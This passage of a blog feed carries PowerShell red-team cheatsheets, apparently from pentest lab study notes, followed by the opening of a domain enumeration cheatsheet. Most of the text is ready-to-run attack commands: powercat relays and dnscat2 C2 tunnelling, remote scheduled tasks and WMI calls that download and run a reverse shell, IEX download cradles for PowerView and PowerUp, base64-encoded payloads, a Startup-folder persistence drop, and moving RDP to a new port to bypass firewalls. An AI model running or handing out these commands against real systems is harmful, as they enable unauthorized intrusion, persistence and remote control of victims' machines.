&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Relay traffic coming in on port 8000 over tcp to port 9000 on 10.1.1.1 over tcp:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-l&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">8000&lt;/span> &lt;span class="n">-r&lt;/span> &lt;span class="n">tcp&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">10.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mf">1&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">9000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Connect to the dnscat2 server on c2.example.com, and send dns queries to the dns server on 10.1.1.1 port 53 (Get the server here: &lt;a href="https://github.com/iagox86/dnscat2%29" target="_blank" rel="noopener">https://github.com/iagox86/dnscat2)&lt;/a>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-c&lt;/span> &lt;span class="mf">10.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">53&lt;/span> &lt;span class="n">-dns&lt;/span> &lt;span class="n">c2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">example&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">com&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Relay traffic coming in on port 8000 over tcp to the dnscat2 server on c2.example.com, sending queries to 10.1.1.1 port 53:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-l&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">8000&lt;/span> &lt;span class="n">-r&lt;/span> &lt;span class="n">dns&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">10.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mf">1&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">53&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">c2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">example&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">com&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>(-d) Disconnect. powercat will disconnect after the connection is established and the input from -i is sent. Used for scanning.&lt;/p>
&lt;p>Generate Payload. Returns a script as a string which will execute the powercat with the options you have specified. -i, -d, and -rep will not be incorporated:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-c&lt;/span> &lt;span class="mf">10.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">443&lt;/span> &lt;span class="n">-ep&lt;/span> &lt;span class="n">-g&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Generate Encoded Payload. Does the same as -g, but returns a string which can be executed in this way: powershell -E&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-c&lt;/span> &lt;span class="mf">10.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">443&lt;/span> &lt;span class="n">-ep&lt;/span> &lt;span class="o">-ge&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Basic TCP Port Scanner:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="mf">21&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mf">22&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mf">80&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mf">443&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">powercat&lt;/span> &lt;span class="n">-c&lt;/span> &lt;span class="mf">10.1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">10&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="nv">$_&lt;/span> &lt;span class="n">-t&lt;/span> &lt;span class="mf">1&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-d&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Start A Persistent Server That Serves a File:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powercat&lt;/span> &lt;span class="n">-l&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="mf">443&lt;/span> &lt;span class="n">-i&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">inputfile&lt;/span> &lt;span class="n">-rep&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="remote-desktop">Remote Desktop&lt;/h2>
&lt;p>Enable RDP on a machine:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-ItemProperty&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="s1">&amp;#39;HKLM:\System\CurrentControlSet\Control\Terminal Server&amp;#39;&lt;/span> &lt;span class="n">-name&lt;/span> &lt;span class="s2">&amp;#34;fDenyTSConnections&amp;#34;&lt;/span> &lt;span class="n">-value&lt;/span> &lt;span class="n">0Enable-NetFirewallRule&lt;/span> &lt;span class="n">-DisplayGroup&lt;/span> &lt;span class="s2">&amp;#34;Remote Desktop&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Change RDP port to 55555 (in order to bypass firewalls):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-ItemProperty&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="s2">&amp;#34;HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\&amp;#34;&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">PortNumber&lt;/span> &lt;span class="n">-Value&lt;/span> &lt;span class="mf">55555&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-NetFirewallRule&lt;/span> &lt;span class="n">-DisplayName&lt;/span> &lt;span class="s2">&amp;#34;New RDP Port 55555&amp;#34;&lt;/span> &lt;span class="n">-Direction&lt;/span> &lt;span class="n">Inbound&lt;/span> &lt;span class="n">-LocalPort&lt;/span> &lt;span class="mf">55555&lt;/span> &lt;span class="n">-Protocol&lt;/span> &lt;span class="n">TCP&lt;/span> &lt;span class="n">-Action&lt;/span> &lt;span class="n">allow&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-NetFirewallRule&lt;/span> &lt;span class="n">-DisplayName&lt;/span> &lt;span class="s2">&amp;#34;New RDP Port 55555&amp;#34;&lt;/span> &lt;span class="n">-Direction&lt;/span> &lt;span class="n">Inbound&lt;/span> &lt;span class="n">-LocalPort&lt;/span> &lt;span class="mf">55555&lt;/span> &lt;span class="n">-Protocol&lt;/span> &lt;span class="n">UDP&lt;/span> &lt;span class="n">-Action&lt;/span> &lt;span class="n">allow&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">net&lt;/span> &lt;span class="n">stop&lt;/span> &lt;span class="n">termservice&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">ynet&lt;/span> &lt;span class="nb">start &lt;/span>&lt;span class="n">termservice&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">y&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="scheduled-tasks">Scheduled Tasks&lt;/h2>
&lt;p>Launch a scheduled task on a remote host to download and execute the script for a reverse shell:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># File share via Web Server&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">schtasks&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">delete&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">S&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER01&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">TN&lt;/span> &lt;span class="s2">&amp;#34;JAVA_CHECK&amp;#34;&lt;/span>&lt;span class="n">schtasks&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">create&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">S&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER01&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="nb">SC &lt;/span>&lt;span class="n">Minute&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">RU&lt;/span> &lt;span class="s2">&amp;#34;NT Authority\SYSTEM&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">TN&lt;/span> &lt;span class="s2">&amp;#34;JAVA_CHECK&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">TR&lt;/span> &lt;span class="s2">&amp;#34;powershell.exe -ep bypass -c &amp;#39;iex (New-Object Net.WebClient).DownloadString(&amp;#39;&amp;#39;http://192.168.50.53/powercat_connect.ps1&amp;#39;&amp;#39;&amp;#39;)&amp;#39;&amp;#34;&lt;/span>&lt;span class="n">schtasks&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">run&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">S&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER01&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">TN&lt;/span> &lt;span class="s2">&amp;#34;JAVA_CHECK&amp;#34;&lt;/span>&lt;span class="c"># File share via SMBNew-SmbShare -Path c:\users\student01\Desktop\shared -Name shared -FullAccess Everyoneschtasks /delete /S &amp;#34;COMPUTER01&amp;#34; /TN &amp;#34;JAVA_CHECK&amp;#34;# Only domain users can access the file share.# To run as SYSTEM the file must reside on the remote machine.schtasks /create /S &amp;#34;COMPUTER01&amp;#34; /SC Minute /RU &amp;#34;CYBERLAB\Administrator&amp;#34; /TN &amp;#34;JAVA_CHECK&amp;#34; /TR &amp;#34;powershell.exe -ep bypass -c &amp;#39;. \\192.168.50.53\shared\powercat.ps1; powercat -c 192.168.50.53 -p 443 -e cmd&amp;#39;&amp;#34;schtasks /run /S &amp;#34;COMPUTER01&amp;#34; /TN &amp;#34;JAVA_CHECK&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="wmi">WMI&lt;/h2>
&lt;p>&lt;em>Requires âHostâ and âRPCSSâ SPNs&lt;/em>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WmiMethod&lt;/span> &lt;span class="n">win32_process&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER01.CYBERLAB.LOCAL&amp;#34;&lt;/span> &lt;span class="n">-name&lt;/span> &lt;span class="n">create&lt;/span> &lt;span class="n">-argumentlist&lt;/span> &lt;span class="s2">&amp;#34;powershell.exe -e &lt;/span>&lt;span class="nv">$encodedCommand&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="file-download">File download&lt;/h2>
&lt;p>Simple download:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Any version&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">New-Object&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Net&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">WebClient&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">DownloadFile&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;http://192.168.119.155/PowerUp.ps1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;C:\Windows\Temp\PowerUp.ps1&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Powershell 4+&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## You can use &amp;#39;IWR&amp;#39; as a shorthand&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WebRequest&lt;/span> &lt;span class="s2">&amp;#34;http://10.10.16.7/Incnspc64.exe&amp;#34;&lt;/span> &lt;span class="n">-OutFile&lt;/span> &lt;span class="s2">&amp;#34;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Incnspc64.exe&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Load file reflectively:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">IEX &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">New-Object&lt;/span> &lt;span class="n">Net&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">WebClient&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">DownloadString&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;http://10.10.16.7/PowerView.ps1&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Encode one-liner:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$command&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s1">&amp;#39;IEX (New-Object Net.WebClient).DownloadString(&amp;#34;http://172.16.100.55/Invoke-PowerShellTcpRun.ps1&amp;#34;)&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$bytes&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">System.Text.Encoding&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">Unicode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">GetBytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$command&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$encodedCommand&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">Convert&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">ToBase64String&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$bytes&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">powershell&lt;/span> &lt;span class="n">-EncodedCommand&lt;/span> &lt;span class="nv">$encodedCommand&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="smb-shares">SMB Shares&lt;/h2>
&lt;p>Create a SMB share:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># MACHINE: COMPUTER1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-SmbShare&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="s2">&amp;#34;SHARED_REPO&amp;#34;&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="s2">&amp;#34;C:\Users\Public\&amp;#34;&lt;/span> &lt;span class="n">-FullAccess&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Grant-SmbShareAccess&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="s2">&amp;#34;SHARED_REPO&amp;#34;&lt;/span> &lt;span class="n">-AccountName&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT2&amp;#34;&lt;/span> &lt;span class="n">-AccessRight&lt;/span> &lt;span class="n">Full&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-SmbShare&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="s2">&amp;#34;SHARED_REPO&amp;#34;&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="s2">&amp;#34;C:\Users\Public\&amp;#34;&lt;/span> &lt;span class="n">-FullAccess&lt;/span> &lt;span class="s2">&amp;#34;Everyone&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Connect to a SMB share:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># USER: CYBERLAB\STUDENT1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">net&lt;/span> &lt;span class="n">use&lt;/span> &lt;span class="n">z:&lt;/span> &lt;span class="p">\\&lt;/span>&lt;span class="n">COMPUTER1&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">SHARED_REPO&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">net&lt;/span> &lt;span class="n">use&lt;/span> &lt;span class="n">z:&lt;/span> &lt;span class="p">\\&lt;/span>&lt;span class="n">COMPUTER1&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">SHARED_REPO&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">u:CYBERLAB&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">STUDENT01&lt;/span> &lt;span class="n">Password123&lt;/span>&lt;span class="p">.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>or:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-SmbMapping&lt;/span> &lt;span class="n">-LocalPath&lt;/span> &lt;span class="s2">&amp;#34;x:&amp;#34;&lt;/span> &lt;span class="n">-RemotePath&lt;/span> &lt;span class="s2">&amp;#34;\\COMPUTER1\SHARED_REPO&amp;#34;&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENTI1&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Password123.&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="powershell-webserver">PowerShell WebServer&lt;/h2>
&lt;p>Start a web server on port 8080 in order to share files:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># MACHINE: COMPUTER1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Start-WebServer.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="nb">Start-WebServer&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span> &lt;span class="s2">&amp;#34;http://+:8080/&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Download a file from another machine:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># MACHINE: COMPUTER 2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WebRequest&lt;/span> &lt;span class="n">-Uri&lt;/span> &lt;span class="n">http&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">//&lt;/span>&lt;span class="n">COMPUTER1&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">8080&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span> &lt;span class="n">-OutFile&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">file&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">iex &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">New-Object&lt;/span> &lt;span class="n">Net&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">WebClient&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">DownloadString&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;http://COMPUTER1:8080/PowerUp.ps1&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-AllChecks&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># It can be even used from an MSSQL instance&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Execute-Command&lt;/span>&lt;span class="n">-MSSQL&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s1">&amp;#39;sa&amp;#39;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s1">&amp;#39;Password&amp;#39;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s1">&amp;#39;MSSQLSERVER01&amp;#39;&lt;/span> &lt;span class="n">-payload&lt;/span> &lt;span class="s2">&amp;#34;iex (New-Object Net.WebClient).DownloadString(&amp;#39;http://192.168.1.10:8080/PowerUp.ps1&amp;#39;); Invoke-AllChecks&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Close the web server:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># MACHINE: COMPUTER 2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WebRequest&lt;/span> &lt;span class="n">-Uri&lt;/span> &lt;span class="n">http&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">//&lt;/span>&lt;span class="n">COMPUTER1&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">8080&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">quit&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="base64-script-conversion">Base64 script conversion&lt;/h2>
&lt;p>In order to perform remote code execution it can be helpful to convert a script in &lt;em>Base64&lt;/em> format:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$Base64&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">System.Convert&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">ToBase64String&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="no">System.IO.File&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">ReadAllBytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;c:\path\to\script\file.ps1&amp;#39;&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">powershell&lt;/span> &lt;span class="n">-EncodedCommand&lt;/span> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="n">Base64String&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr></description></item><item><title>Domain Enumeration cheatsheet</title><link>https://www.peco602.com/post/0000-domain-enumeration-cheatsheet/</link><pubDate>Sun, 17 Jul 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/post/0000-domain-enumeration-cheatsheet/</guid><description>&lt;h2 id="module-import">Module Import&lt;/h2>
&lt;p>Load the PowerView module:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powershell&lt;/span> &lt;span class="n">-ep&lt;/span> &lt;span class="n">bypass&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">PowerView&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>or the ActiveDirectory module (to use ActiveDirectory module without installing RSAT, we can use &lt;code>Import-Module&lt;/code> for the valid Active Directory module DLL):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Import-Module&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">Microsoft&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ActiveDirectory&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Management&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">dll&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Import-Module&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">ActiveDirectory&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">ActiveDirectory&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">psd1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It works also in case of ConstrainedLanguage Mode:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$ExecutionContext&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">SessionState&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">LanguageMode&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="basic-enumeration">Basic Enumeration&lt;/h2>
&lt;p>Get current domain or trusted domain objects:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetDomain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetDomain&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;cyberlab.cybercorp.local&amp;#34;&lt;/span>
